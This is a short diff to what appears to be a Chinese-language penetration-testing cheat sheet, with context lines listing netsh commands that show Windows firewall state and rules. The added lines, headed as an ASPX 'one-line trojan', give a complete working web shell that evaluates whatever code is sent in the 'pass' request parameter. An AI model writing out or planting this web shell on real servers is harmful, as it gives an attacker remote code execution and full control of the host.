@@ -15,3 +15,7 @@ netsh firewall show state
 ```
 netsh advfirewall firewall show rule name=all dir=in type=dynamic
 ```
+# ASPX 一句话木马
+```
+<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
+```
